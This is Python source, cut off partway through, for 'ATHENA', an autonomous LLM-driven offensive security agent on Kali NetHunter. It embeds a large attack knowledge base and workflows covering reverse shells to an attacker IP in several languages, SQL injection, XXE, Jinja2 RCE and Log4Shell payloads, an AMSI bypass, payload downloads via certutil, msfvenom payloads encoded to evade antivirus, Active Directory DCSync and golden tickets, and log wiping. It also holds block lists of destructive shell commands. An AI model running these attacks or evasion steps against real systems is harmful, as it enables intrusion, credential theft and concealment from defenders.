#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║           ATHENA — AI Offensive Security Agent v6.1              ║
║   Bare-metal Kali NetHunter | sdm845 | Phosh UI                  ║
║   Commander: The Priest                                           ║
║   Auto-exploit | Persistent findings | Stuck recovery             ║
╚══════════════════════════════════════════════════════════════════╝

v6.1 IMPROVEMENTS:
- Auto-exploit engine: CVE → searchsploit → suggest execution
- Persistent findings: saved to ~/.athena/findings.json
- Stuck recovery: actually works now (triggers at 3 failures)
- Rate limit resilience: retries request on new provider
- Smart credential attacks: uses wordlist files
- Wildcard detection: adapts gobuster when server returns 200 for all
"""

import os
import sys
import subprocess
import re
import datetime
import json

try:
    from groq import Groq
except ImportError:
    print("FATAL: groq not installed. Run: pip install groq")
    sys.exit(1)

try:
    from cerebras.cloud.sdk import Cerebras
except ImportError:
    Cerebras = None

try:
    import readline
except ImportError:
    pass


# ─────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────

VERSION = "6.1"

PROVIDER_CHAIN = [
    ("groq", "llama-3.3-70b-versatile",                       "LLaMA 3.3 70B"),
    ("groq", "openai/gpt-oss-120b",                            "GPT-OSS 120B"),
    ("groq", "meta-llama/llama-4-scout-17b-16e-instruct",      "LLaMA 4 Scout 17B"),
    ("groq", "qwen/qwen3-32b",                                  "Qwen3 32B"),
    ("groq", "groq/compound",                                   "Groq Compound"),
    ("groq", "openai/gpt-oss-20b",                              "GPT-OSS 20B"),
    ("groq", "groq/compound-mini",                              "Compound Mini"),
    ("groq", "allam-2-7b",                                      "Allam 2 7B"),
    ("groq", "llama-3.1-8b-instant",                            "LLaMA 3.1 8B"),
]

INSTALL_DIR = os.path.expanduser("~/.athena")
LOG_DIR     = os.path.join(INSTALL_DIR, "logs")
FINDINGS_FILE = os.path.join(INSTALL_DIR, "findings.json")
BOOT_LOCK   = "/tmp/athena_session.lock"

BANNED_COMMANDS = [
    "apt upgrade", "apt full-upgrade",
    "apt-get upgrade", "apt-get full-upgrade", "apt dist-upgrade",
]
BANNED_UPGRADE_PACKAGES = ["phosh", "lightdm", "xfce", "x11", "gnome-shell"]

DESTRUCTIVE_COMMANDS = [
    r'\brm\s+-rf\s+/',
    r'\brm\s+-rf\s+\*',
    r'\brm\s+-rf\s+~',
    r'\bdd\s+if=',
    r'\bmkfs\b',
    r'>\s*/dev/sd[a-z]',
    r':\(\)\{.*\|.*&.*\};:',
    r'\bchmod\s+-R\s+777\s+/',
    r'\bchown\s+-R.*\s+/',
    r'\bshutdown\b',
    r'\bhalt\b',
    r'\binit\s+0',
    r'\binit\s+6',
    r'\bpoweroff\b',
    r'>\s*/dev/null\s+2>&1\s*&\s*$',
]

DOUBLE_CONFIRM = [
    r'systemctl\s+(stop|disable|mask)',
    r'service\s+\S+\s+stop',
    r'iptables\s+-F',
    r'ufw\s+disable',
    r'>\s*/etc/',
    r'sed\s+-i.*\s+/etc/',
    r'echo.*>>\s*/etc/',
    r'echo.*>\s*/etc/',
    r'chmod\s+\+s\s+',
    r'useradd\s+',
    r'userdel\s+',
    r'passwd\s+',
    r'\bkillall\b',
]

INTERACTIVE_BLOCKED = {
    "msfconsole":   "Use: msfconsole -q -r /tmp/script.rc (script must end with 'exit')",
    "mysql -u":     "Use: mysql -u USER -pPASS -e 'QUERY;' for non-interactive query",
    "psql":         "Use: psql -c 'QUERY;' for non-interactive query",
    "telnet":       "Use: nc -nv [IP] [PORT] for one-shot banner grab",
    "nc -l":        "Listener blocked — would hang Athena. Run in separate terminal.",
    "ncat -l":      "Listener blocked — would hang Athena. Run in separate terminal.",
    "vim ":         "Use: cat or sed for non-interactive file ops",
    "vi ":          "Use: cat or sed for non-interactive file ops",
    "nano ":        "Use: cat or sed for non-interactive file ops",
    "less ":        "Use: cat or head/tail for non-interactive viewing",
    "more ":        "Use: cat or head/tail for non-interactive viewing",
    "top":          "Use: ps aux for non-interactive process list",
    "htop":         "Use: ps aux for non-interactive process list",
    "ssh ":         "SSH interactive — use sshpass -p PASS ssh user@host 'COMMAND' instead",
    "ftp ":         "FTP interactive — use curl ftp://user:pass@host/file instead",
    "gdb ":         "GDB interactive — use gdb -batch -ex 'cmd' instead",
}

MAX_HISTORY_MESSAGES = 10
MAX_OUTPUT_CHARS     = 4000
WORKFLOW_DONE        = "WORKFLOW_COMPLETE"

FINDING_PATTERNS = {
    "ip":         r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b',
    "port":       r'(\d+)/tcp\s+open\s+(\S+)',
    "user":       r'(?:user(?:name)?|login)[:\s]+([a-zA-Z0-9_\.\-]{3,32})',
    "hash_ntlm":  r'\b([a-fA-F0-9]{32}:[a-fA-F0-9]{32})\b',
    "hash":       r'\b([a-fA-F0-9]{40,64})\b',
    "cred":       r'(?:password|passwd|pass)[:\s=]+([^\s\n\r]{4,32})',
    "cve":        r'(CVE-\d{4}-\d+)',
    "svc":        r'\d+/tcp\s+open\s+\S+\s+(.+?)(?:\n|$)',
    "domain":     r'\b([a-zA-Z0-9\-]+\.[a-zA-Z]{2,6})\b',
}

IP_NOISE = {'0.0.0.0','127.0.0.1','255.255.255.255','8.8.8.8','8.8.4.4'}

# Credential wordlists (fallback to hardcoded if files missing)
CRED_WORDLISTS = [
    "/usr/share/wordlists/metasploit/common_passwords.txt",
    "/usr/share/wordlists/fasttrack.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt",
]

FALLBACK_PASSWORDS = [
    "admin", "password", "123456", "root", "toor", "kali",
    "admin123", "password123", "letmein", "welcome", "default"
]


# ─────────────────────────────────────────────────────────────
# KNOWLEDGE BASE (same as v6.0)
# ─────────────────────────────────────────────────────────────

KB = {}

KB[1] = r"""
S1 MINDSET: Pick minimum-path action toward goal. Map trust boundaries (web→DB→AD). 
Note noise: nmap -p- LOUD, gobuster MED, curl QUIET. Three approaches per goal — fall back fast.
Skip phases when findings already cover them. APT mindset: every cmd deliberate."""

KB[2] = r"""
SECTION 2 — NETWORK RECON:
Host discovery: arp-scan -l | fping -ag 192.168.1.0/24 | for i in {1..254}; do ping -c1 -W1 192.168.1.$i &>/dev/null && echo up; done
Fast scan: nmap -sS -T4 --min-rate 5000 | masscan -p1-65535 --rate=1000
Banner grab: nc -nv [IP] [PORT] | telnet [IP] [PORT]
Key script categories: --script vuln | --script smb-* | --script http-* | --script ssl-*
Firewall detection: nmap -sA (ACK scan) | nmap --reason | nmap -f (fragment)
OS detection: nmap -O | nmap -A"""

KB[3] = r"""
SECTION 3 — WEB EXPLOITATION:
Always manually browse first — automated tools miss business logic, race conditions, multi-step vulns.
SQL injection: ' OR '1'='1'-- | ' OR SLEEP(5)-- | ' UNION SELECT NULL,NULL-- (add NULLs until no error)
File read MySQL: ' UNION SELECT load_file('/etc/passwd'),NULL--
XSS bypass: <img src=x onerror=alert(1)> | <svg onload=alert(1)> | "><script>alert(1)</script>
SSRF targets: http://169.254.169.254/latest/meta-data/ (AWS) | http://metadata.google.internal/computeMetadata/v1/ (GCP) | internal services http://localhost:PORT
LFI to RCE: read /etc/passwd -> read logs -> inject PHP in User-Agent -> include log file
XXE: <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
Template injection test: {{7*7}} ${7*7} <%= 7*7 %> -- if 49 in response = confirmed
Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
JWT attacks: decode with base64 -d | try alg:none | brute secret with hashcat -m 16500
File upload bypass: change Content-Type to image/jpeg | double ext shell.php.jpg | null byte shell.php%00.jpg"""

KB[4] = r"""
SECTION 4 — ACTIVE DIRECTORY:
Kill chain: unauthenticated enum -> usernames -> AS-REP roast -> crack -> authenticated enum -> ACL abuse -> DCSync
AS-REP roast (no creds): impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip [DC]
  Crack: hashcat -m 18200 hash.txt rockyou.txt
Kerberoast (needs account): impacket-GetUserSPNs domain/user:pass -dc-ip [DC] -request
  Crack: hashcat -m 13100 hash.txt rockyou.txt
Pass-the-hash: impacket-psexec domain/user@[IP] -hashes :[NTLM] | crackmapexec smb [IP] -u user -H [HASH]
DCSync (DA rights): impacket-secretsdump domain/admin:pass@[DC] -- dumps ALL hashes
Golden ticket: impacket-ticketer -nthash [KRBTGT_HASH] -domain-sid [SID] -domain [DOMAIN] Administrator
Zerologon (CVE-2020-1472): nmap --script smb-vuln-zerologon [DC] -- unauthenticated DC compromise
ADCS ESC1: certipy find -u user@domain -p pass -dc-ip [DC] | certipy req -upn administrator@domain
ACL abuse: GenericAll=reset password | WriteDACL=grant yourself rights | GenericWrite=set SPN then Kerberoast"""

KB[5] = r"""
SECTION 5 — LINUX PRIVESC:
Sudo GTFOBins: vim -> :!bash | find -> sudo find . -exec /bin/bash \; | python -> import os;os.system("/bin/bash") | awk -> awk 'BEGIN{system("/bin/bash")}' | less -> !/bin/bash
SUID: /usr/bin/find -exec /bin/bash -p \; | /usr/bin/python -c 'import os;os.execl("/bin/sh","sh","-p")'
Cron abuse: if script writable -> echo 'chmod +s /bin/bash' >> script.sh | wildcard injection with tar *
Capabilities: getcap -r / 2>/dev/null | python3 cap_setuid -> os.setuid(0);os.system("/bin/bash")
Docker group: docker run -v /:/mnt -it alpine chroot /mnt /bin/bash -- instant root
Writable /etc/passwd: openssl passwd -1 newpass -> append newroot:hash:0:0:root:/root:/bin/bash
Kernel exploits: check uname -r against linux-exploit-suggester | Dirty COW < 4.8.3
NFS no_root_squash: cat /etc/exports -> mount share -> cp bash -> chmod +s -> execute -p"""

KB[6] = r"""
SECTION 6 — WINDOWS PRIVESC:
SeImpersonatePrivilege: whoami /priv -> PrintSpoofer (Win10/2019) | GodPotato (2012-2022) | JuicyPotato (2016 and below)
Unquoted paths: wmic service get name,pathname | findstr /i /v "C:\\Windows" | findstr /i /v quoted
  Place binary earlier in path -> restarts as SYSTEM
AlwaysInstallElevated: reg query HKCU/HKLM ...\\Installer /v AlwaysInstallElevated -- both must be 1
  msfvenom -p windows/exec CMD='net user...' -f msi | msiexec /quiet /i evil.msi
Stored creds: cmdkey /list | reg query HKLM /f password /t REG_SZ /s | dir /s *pass* *cred*
Weak service perms: accesschk -uwcqv "Authenticated Users" * | sc config [svc] binPath= "cmd /c [payload]" """

KB[7] = r"""
SECTION 7 — POST-EXPLOITATION:
LOTL Linux: bash python3 perl ruby php nc socat curl wget find cat awk base64 openssl
LOTL Windows: cmd powershell certutil bitsadmin msiexec regsvr32 rundll32 wmic mshta
Persistence Linux: ~/.bashrc | crontab -e | ~/.ssh/authorized_keys | /etc/rc.local
Persistence Windows: reg HKCU\\...\\Run | schtasks /create | sc create
Log cleaning: history -c && history -w | echo "" > /var/log/auth.log | unset HISTFILE
Pivoting: ssh -L 8080:internal:80 | ssh -D 1080 (SOCKS) | socat TCP-LISTEN:8080,fork TCP:target:80
Chisel: server -> chisel server -p 9000 --reverse | client -> chisel client [SVR]:9000 R:8080:internal:80
Cred hunting Linux: find / -name id_rsa | find / -name .env | find / -name wp-config.php | grep -r password /etc/
Cred hunting Windows: reg query "...\\Winlogon" | netsh wlan show profile [SSID] key=clear"""

KB[8] = r"""
SECTION 8 — HIGH VALUE CVEs:
Apache 2.4.49 CVE-2021-41773: curl --path-as-is 'http://[IP]/cgi-bin/.%2F.%2F.%2Fetc/passwd'
EternalBlue MS17-010: nmap --script smb-vuln-ms17-010 | use exploit/windows/smb/ms17_010_eternalblue
Zerologon CVE-2020-1472: impacket-zerologon [DC_HOST] [DC_IP] -- reset DC password -> DCSync
PrintNightmare CVE-2021-34527: use exploit/windows/local/cve_2021_34527_printnightmare
Shellshock CVE-2014-6271: curl -H 'User-Agent: () { :; }; /bin/cat /etc/passwd' http://[IP]/cgi-bin/test.cgi
Log4Shell CVE-2021-44228: ${jndi:ldap://[attacker]/a} in any logged field (User-Agent username search)
Heartbleed CVE-2014-0160: nmap --script ssl-heartbleed | leaks 64KB server memory per request
Dirty COW CVE-2016-5195: Linux kernel < 4.8.3 -- race condition write to read-only memory
Sudo Baron Samedit CVE-2021-3156: sudo < 1.9.5p2 -- heap overflow -> root without password"""

KB[9] = r"""
SECTION 9 — EVASION:
AMSI bypass PowerShell: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Payload encoding: msfvenom -e x64/xor_dynamic -i 10 -- reduces signature detection not behaviour
LOTL delivery: certutil -urlcache -split -f http://[IP]/shell.exe | bitsadmin /transfer job http://[IP]/shell.exe
Network evasion: use HTTPS C2 on port 443 | randomise User-Agent | slow and low timing
File upload bypass: Content-Type: image/jpeg with PHP content | shell.php.jpg | shell.PhP | shell.phtml
Fragmentation: nmap -f --mtu 8 | decoys: nmap -D RND:10 | timing: nmap -T1 --scan-delay 10s"""

KB[10] = r"""
SECTION 10 — CREDENTIAL ATTACKS:
Password reuse: if admin:admin found on one device try all similar devices immediately
Default creds: routers admin/admin | Tomcat tomcat/tomcat | Jenkins admin/admin | MySQL root/[blank] | Redis no auth | Postgres postgres/postgres | Elasticsearch no auth old versions
Hash modes: MD5=-m 0 | SHA1=-m 100 | NTLM=-m 1000 | NTLMv2=-m 5600 | WPA2=-m 22000 | bcrypt=-m 3200 | Kerberoast=-m 13100 | AS-REP=-m 18200
Spray timing: default AD lockout 5 attempts/30min = 1 password per 30min across all users
crackmapexec spray: cme smb [IP] -u users.txt -p 'Password1' --continue-on-success"""

KB[11] = r"""
SECTION 11 — VERIFIED MSF MODULES:
exploit/windows/smb/ms17_010_eternalblue | exploit/multi/handler | exploit/unix/ftp/vsftpd_234_backdoor
exploit/unix/irc/unreal_ircd_3281_backdoor | exploit/windows/http/rejetto_hfs_exec
auxiliary/scanner/smb/smb_ms17_010 | auxiliary/scanner/portscan/tcp | auxiliary/scanner/smb/smb_login
auxiliary/scanner/ftp/ftp_login | auxiliary/scanner/ssh/ssh_login
post/multi/recon/local_exploit_suggester | post/linux/gather/hashdump | post/windows/gather/hashdump
Resource script template (LAST LINE MUST BE exit):
  use [verified_module]
  set RHOSTS [target]
  set LHOST [lhost]
  set LPORT [port]
  run
  exit"""

KB[12] = r"""
SECTION 12 — REVERSE SHELLS:
bash: bash -i >& /dev/tcp/[IP]/4444 0>&1
python3: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
nc: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [IP] 4444 >/tmp/f
php: php -r '$sock=fsockopen("[IP]",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
powershell: powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('[IP]',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$send=(iex $data 2>&1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($send+'PS '+(pwd).Path+'> ');$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
Listener: rlwrap nc -lvnp 4444
TTY upgrade: python3 -c 'import pty;pty.spawn("/bin/bash")' then Ctrl+Z then stty raw -echo;fg then export TERM=xterm"""

KB[13] = r"""
SECTION 13 — NETWORK SERVICES:
FTP 21: ftp [IP] anonymous:anonymous | vsftpd 2.3.4 backdoor :) triggers port 6200
SSH 22: ssh-audit for weak algos | CVE-2018-15473 user enum | ssh -i id_rsa if key found
SMTP 25: nc [IP] 25 then VRFY/EXPN for user enum | open relay test MAIL FROM RCPT TO external
SMB 445: EternalBlue check | anonymous share list smbclient -L -N | signing check with cme
RDP 3389: xfreerdp /u:user /p:pass /v:[IP]
MySQL 3306: mysql -h [IP] -u root --password= | SELECT user,password FROM mysql.user
Redis 6379: redis-cli -h [IP] then KEYS * | write SSH key via CONFIG SET
MongoDB 27017: mongo [IP]:27017 no auth old versions | show dbs
Elasticsearch 9200: curl http://[IP]:9200/_cat/indices then dump"""

KB[14] = r"""
S14 DECISION TREES:
Web→tech ID→CVE→inputs(SQLi/XSS/LFI)→robots.txt→default creds→upload.
Shell→pty stabilise→id/uname/sudo -l→SUID/cron/GTFOBins→linpeas→creds.
Unknown port→nc banner→nmap -sV→curl→searchsploit.
Stuck→re-enum→UDP→vhosts→authenticated recon→second-order."""


# ─────────────────────────────────────────────────────────────
# WORKFLOW KB MAPPING (same as v6.0)
# ─────────────────────────────────────────────────────────────

WORKFLOW_KB_MAP = {
    "1":  [2, 8, 14],
    "2":  [3, 8, 14],
    "3":  [5, 7, 10, 14],
    "4":  [11, 12],
    "5":  [3, 10, 14],
    "6":  [10],
    "7":  [10, 13],
    "8":  [4, 10, 9],
    "9":  [11, 12, 9],
    "10": [2],
    "11": [2, 3, 14],
    "12": [2, 8],
    "13": [2, 13],
    "14": [4, 10, 13],
    "15": [3, 14],
    "16": [5, 7, 14],
    "17": [6, 7, 10],
    "18": [4, 7, 9],
    "19": [7, 9],
    "20": [9, 2],
    "21": [7, 9],
    "22": [14],
    "23": [14],
}

KEYWORD_KB_MAP = {
    "web|http|https|sql|xss|lfi|rfi|ssrf|api|jwt|oauth|cookie|upload": [3, 14],
    "smb|windows|active directory|domain|kerberos|ntlm|ldap|dc|ad": [4, 10],
    "linux|sudo|suid|cron|privilege|root|privesc|escalat": [5, 7, 14],
    "windows|system|service|token|potato|uac|dll": [6, 7, 10],
    "hash|crack|hashcat|password|spray|brute|credential": [10, 12],
    "metasploit|msf|msfvenom|payload|shell|reverse": [11, 12],
    "evasion|bypass|amsi|antivirus|av|ids|ips|stealth": [9],
    "lateral|pivot|pass.the|pth|dcsync|secretsdump": [4, 7, 9],
    "nmap|scan|recon|network|port|service": [2, 8, 14],
    "cloud|docker|container|aws|gcp|azure|kubernetes|k8s": [7, 9],
}


def get_kb_sections(workflow_key: str = None, prompt_text: str = "") -> str:
    """Return only the KB sections relevant to this workflow or prompt."""
    section_nums = {1}
    if workflow_key and workflow_key in WORKFLOW_KB_MAP:
        section_nums.update(WORKFLOW_KB_MAP[workflow_key])
    elif prompt_text:
        lower = prompt_text.lower()
        for pattern, nums in KEYWORD_KB_MAP.items():
            if re.search(pattern, lower):
                section_nums.update(nums)
        if len(section_nums) == 1:
            section_nums.update([2, 14])
    parts = []
    for num in sorted(section_nums):
        if num in KB:
            parts.append(KB[num])
    return "\n\n".join(parts)


# ─────────────────────────────────────────────────────────────
# WORKFLOWS (same as v6.0 — keeping all 23)
# ─────────────────────────────────────────────────────────────

WORKFLOWS = {
    "1": {
        "name": "Network Recon",
        "description": "ARP sweep -> port scan -> service detection -> CVE correlation",
        "prompt": (
            "Elite network recon against: {target}.\n"
            "Phase 1: arp-scan -l for live hosts.\n"
            "Phase 2: nmap -sn ping sweep.\n"
            "Phase 3: nmap -sV -sC -p- --min-rate 1000 full scan.\n"
            "Phase 4: nmap -O OS fingerprint.\n"
            "Phase 5: searchsploit every service version found.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "2": {
        "name": "Web Enumeration",
        "description": "Tech fingerprint -> vuln scan -> dir brute -> vhost",
        "prompt": (
            "Elite web enumeration against: {target}.\n"
            "Phase 1: whatweb -a 3 aggressive fingerprint.\n"
            "Phase 2: nikto -h {target}.\n"
            "Phase 3: gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,zip.\n"
            "Phase 4: Check robots.txt .env .git/HEAD backup files.\n"
            "Phase 5: gobuster vhost if domain found.\n"
            "Phase 6: searchsploit every technology version.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "3": {
        "name": "Post-Exploitation",
        "description": "Identity -> sudo -> SUID -> cron -> network -> creds",
        "prompt": (
            "Elite post-exploitation on current host.\n"
            "Phase 1: id whoami hostname uname -a ip a.\n"
            "Phase 2: sudo -l -- check GTFOBins for every entry.\n"
            "Phase 3: find / -perm -4000 -type f 2>/dev/null -- GTFOBins every result.\n"
            "Phase 4: crontab -l && cat /etc/crontab -- look for writable scripts.\n"
            "Phase 5: ss -tulnp for internal services.\n"
            "Phase 6: Hunt creds in bash_history conf files SSH keys env vars.\n"
            "Phase 7: cat /etc/passwd for real user accounts.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "4": {
        "name": "Metasploit Exploit",
        "description": "Verify module -> resource script -> non-interactive run",
        "prompt": (
            "Run Metasploit against: {target}.\n"
            "Phase 1: Verify module exists: msfconsole -q -x 'search [keyword]; exit'\n"
            "Phase 2: Write /tmp/athena_msf.rc with tee. Include: use set RHOSTS set LHOST set LPORT run exit. LAST LINE MUST BE exit.\n"
            "Phase 3: msfconsole -q -r /tmp/athena_msf.rc\n"
            "NEVER use unverified modules. One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "5": {
        "name": "SQL Injection",
        "description": "sqlmap full auto with manual verification",
        "prompt": (
            "SQL injection assessment against: {target}.\n"
            "Phase 1: Manual test -- append ' to parameters observe errors.\n"
            "Phase 2: sqlmap -u {target} --dbs --batch --random-agent --level=3 --risk=2.\n"
            "Phase 3: Dump tables from interesting databases.\n"
            "Phase 4: Extract credentials and sensitive data.\n"
            "Phase 5: Test --os-shell if MySQL with FILE privilege.\n"
            "Phase 6: If creds found test across all session services immediately.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "6": {
        "name": "Hash Cracking",
        "description": "hashcat auto -- identify mode crack escalate",
        "prompt": (
            "Crack hash or capture at: {target}.\n"
            "Phase 1: hashid to identify type.\n"
            "Phase 2: Check rockyou exists -- if only .gz: gunzip /usr/share/wordlists/rockyou.txt.gz\n"
            "Phase 3: hashcat -m [mode] {target} /usr/share/wordlists/rockyou.txt --show first.\n"
            "Phase 4: If not cached run full hashcat attack.\n"
            "Phase 5: If fails: add -r /usr/share/hashcat/rules/best64.rule\n"
            "Phase 6: If still fails: mask attack -a 3 ?u?l?l?l?l?d?d?d\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "7": {
        "name": "Password Spraying",
        "description": "Hydra + crackmapexec -- spray with lockout awareness",
        "prompt": (
            "Password spraying against: {target}.\n"
            "Phase 1: nmap -sV -p 21,22,80,443,445,3389 {target}.\n"
            "Phase 2: Check password policy with enum4linux or crackmapexec before spraying.\n"
            "Phase 3: Spray SSH with hydra respecting lockout timing.\n"
            "Phase 4: Spray SMB with crackmapexec --continue-on-success.\n"
            "Phase 5: Any valid creds -- immediately test across ALL other services.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "8": {
        "name": "Active Directory Recon",
        "description": "Full AD kill chain -- enum to DCSync",
        "prompt": (
            "Elite AD attack chain against: {target}.\n"
            "Phase 1: enum4linux -a {target}.\n"
            "Phase 2: crackmapexec smb {target} --users --groups --pass-pol.\n"
            "Phase 3: impacket-GetNPUsers -dc-ip {target} -no-pass for AS-REP roasting.\n"
            "Phase 4: impacket-GetUserSPNs -dc-ip {target} for Kerberoasting.\n"
            "Phase 5: Crack any hashes obtained with hashcat.\n"
            "Phase 6: If creds found try impacket-secretsdump for DCSync.\n"
            "Phase 7: Check certipy for ADCS vulnerabilities.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "9": {
        "name": "Payload Generation",
        "description": "msfvenom staged stageless payloads + auto listener",
        "prompt": (
            "Generate payloads for: {target}.\n"
            "Phase 1: Get LHOST: hostname -I | awk '{print $1}'\n"
            "Phase 2: Windows x64: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=4444 -f exe -e x64/xor_dynamic -i 5 -o /tmp/shell.exe\n"
            "Phase 3: Linux ELF: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=4445 -f elf -o /tmp/shell.elf\n"
            "Phase 4: PHP: msfvenom -p php/meterpreter_reverse_tcp LHOST=[LHOST] LPORT=4446 -f raw -o /tmp/shell.php\n"
            "Phase 5: Write multi/handler resource script with exit as last line and launch.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "10": {
        "name": "Bluetooth Recon",
        "description": "hcitool + sdptool -- BT device discovery",
        "prompt": (
            "Bluetooth recon. Interface: {target}.\n"
            "Phase 1: hciconfig -a list interfaces.\n"
            "Phase 2: hcitool scan classic devices.\n"
            "Phase 3: timeout 15 hcitool lescan BLE devices.\n"
            "Phase 4: sdptool browse [MAC] for each device.\n"
            "Phase 5: l2ping [MAC] connectivity test.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "11": {
        "name": "OSINT Profiling",
        "description": "theHarvester + whois + dig -- passive intel",
        "prompt": (
            "Passive OSINT against: {target}.\n"
            "Phase 1: whois {target}.\n"
            "Phase 2: dig {target} ANY +noall +answer.\n"
            "Phase 3: theHarvester -d {target} -b google,bing,crtsh -l 500.\n"
            "Phase 4: curl -s 'https://crt.sh/?q=%25.{target}&output=json' for cert transparency.\n"
            "Phase 5: Probe each discovered subdomain with whatweb.\n"
            "Phase 6: Check for exposed .git repos.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "12": {
        "name": "SSL/TLS Audit",
        "description": "sslscan + testssl.sh + sslyze -- full cipher audit",
        "prompt": (
            "SSL/TLS audit against: {target}.\n"
            "Phase 1: sslscan {target}.\n"
            "Phase 2: testssl.sh --severity MEDIUM {target}.\n"
            "Phase 3: sslyze --regular {target}.\n"
            "Phase 4: openssl s_client -connect {target}:443 manual inspect.\n"
            "Phase 5: nmap --script ssl-dh-params {target}.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "13": {
        "name": "DNS Enumeration",
        "description": "dnsrecon + fierce + dnsenum -- zone transfer brute-force",
        "prompt": (
            "DNS enumeration against: {target}.\n"
            "Phase 1: dnsrecon -d {target} -t std.\n"
            "Phase 2: dnsrecon -d {target} -t axfr zone transfer attempt.\n"
            "Phase 3: fierce --domain {target} subdomain brute-force.\n"
            "Phase 4: dnsenum {target}.\n"
            "Phase 5: nmap -p 53 --script dns-recursion {target} open resolver check.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "14": {
        "name": "SMB Attack",
        "description": "EternalBlue check -> enum -> relay candidate -> SAM dump",
        "prompt": (
            "SMB attack chain against: {target}.\n"
            "Phase 1: nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796 {target}.\n"
            "Phase 2: smbclient -L {target} -N anonymous enum.\n"
            "Phase 3: crackmapexec smb {target} --shares.\n"
            "Phase 4: enum4linux -a {target}.\n"
            "Phase 5: Check SMB signing -- if disabled note as relay candidate.\n"
            "Phase 6: If creds in findings: crackmapexec smb {target} -u [user] -p [pass] --sam.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "15": {
        "name": "API Security Testing",
        "description": "ffuf + arjun + curl -- endpoint discovery auth bypass injection",
        "prompt": (
            "API security testing against: {target}.\n"
            "Phase 1: curl -I {target} headers fingerprint.\n"
            "Phase 2: ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,204,301,302,403.\n"
            "Phase 3: arjun -u {target} hidden parameters.\n"
            "Phase 4: IDOR test -- manipulate numeric IDs in endpoints.\n"
            "Phase 5: Auth bypass -- requests without Authorization header.\n"
            "Phase 6: JWT decode and test: echo [token] | cut -d. -f2 | base64 -d\n"
            "Phase 7: SSRF test in URL params: http://169.254.169.254/latest/meta-data/\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "16": {
        "name": "Linux Privilege Escalation",
        "description": "linpeas + GTFOBins + kernel exploits",
        "prompt": (
            "Linux privilege escalation on current host.\n"
            "Phase 1: Download linpeas if not present: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lpe.sh && chmod +x /tmp/lpe.sh\n"
            "Phase 2: /tmp/lpe.sh 2>/dev/null | tee /tmp/lpe_out.txt\n"
            "Phase 3: linux-exploit-suggester for kernel CVEs.\n"
            "Phase 4: GTFOBins every SUID and sudo entry found.\n"
            "Phase 5: getcap -r / 2>/dev/null capabilities.\n"
            "Phase 6: id | grep docker -- if yes instant root.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "17": {
        "name": "Windows Privilege Escalation",
        "description": "winpeas + token abuse + service misconfigs",
        "prompt": (
            "Windows privilege escalation. Target: {target}.\n"
            "Phase 1: systeminfo OS version and patches.\n"
            "Phase 2: whoami /priv -- SeImpersonatePrivilege = use PrintSpoofer or GodPotato.\n"
            "Phase 3: wmic service get name,pathname for unquoted service paths.\n"
            "Phase 4: reg query AlwaysInstallElevated.\n"
            "Phase 5: cmdkey /list stored credentials.\n"
            "Phase 6: Deliver winpeas via msfvenom or certutil download.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "18": {
        "name": "Lateral Movement",
        "description": "pass-the-hash -> wmiexec -> DCSync -> pivoting",
        "prompt": (
            "Lateral movement toward: {target}.\n"
            "Phase 1: crackmapexec smb {target}/24 with creds or hashes from findings.\n"
            "Phase 2: If NTLM hash: impacket-psexec [user]@{target} -hashes :[hash].\n"
            "Phase 3: impacket-wmiexec as stealth alternative.\n"
            "Phase 4: impacket-smbexec if others blocked.\n"
            "Phase 5: klist for Kerberos tickets -- use -k flag if found.\n"
